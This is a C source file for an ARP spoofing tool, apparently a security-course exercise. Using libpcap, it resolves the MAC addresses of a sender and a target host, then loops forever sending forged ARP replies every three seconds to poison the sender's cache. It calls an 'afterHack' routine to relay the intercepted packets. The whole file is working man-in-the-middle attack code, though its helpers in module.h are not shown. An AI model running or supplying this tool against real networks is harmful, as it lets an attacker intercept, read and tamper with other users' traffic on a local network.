#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <time.h>
#include "module.h"
#define PERIOD 3 // seconds

void usage() {
  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
  printf("sample: ex : arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
  if (argc%2 != 0) {
    usage();
    return -1;
  }

  char * dev = argv[1];
  char errbuf[PCAP_ERRBUF_SIZE];

  pcap_t * handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

  uint8_t sender_ip[IP_ADDR_LEN], target_ip[IP_ADDR_LEN], attacker_ip[IP_ADDR_LEN];
  uint8_t attacker_mac_address[ETHER_ADDR_LEN], sender_mac_address[ETHER_ADDR_LEN], target_mac_address[ETHER_ADDR_LEN];
  char attacker_ip_ori[16];

  parseIP(sender_ip, argv[2]);
  parseIP(target_ip, argv[3]);
  printIPAddress("Sender ip", sender_ip);
  printIPAddress("Target ip", target_ip);

  getAttackerIPAddress(attacker_ip_ori, dev);
  parseIP(attacker_ip, attacker_ip_ori);
  printIPAddress("Attacker ip", attacker_ip);

  bool atk_ok = getAttackerMacAddress(attacker_mac_address, dev);
  printMacAddress("Attacker Mac Address", atk_ok ? attacker_mac_address : NULL);

  bool sdr_ok = getMacAddress(handle, sender_mac_address, attacker_mac_address, attacker_ip, sender_ip);
  printMacAddress("Sender Mac Address", sdr_ok ? sender_mac_address : NULL);

  bool trg_ok = getMacAddress(handle, target_mac_address, attacker_mac_address, attacker_ip, target_ip);
  printMacAddress("Target Mac Address", trg_ok ? target_mac_address : NULL);

  if(!(atk_ok && sdr_ok && trg_ok)) return 0;
  
  if(atk_ok && sdr_ok) {
    time_t start = time(NULL);
    while(true) {
      time_t cur = time(NULL);
      if(cur - start >= PERIOD) {
        sendArpPacket(handle, attacker_mac_address, sender_mac_address, target_ip, sender_ip, 2);
        start = cur;
      }
      afterHack(handle, attacker_mac_address, target_mac_address, sender_mac_address, sender_ip, target_ip);
      sleep(1);
    }
  }

  pcap_close(handle);

  return 0;
}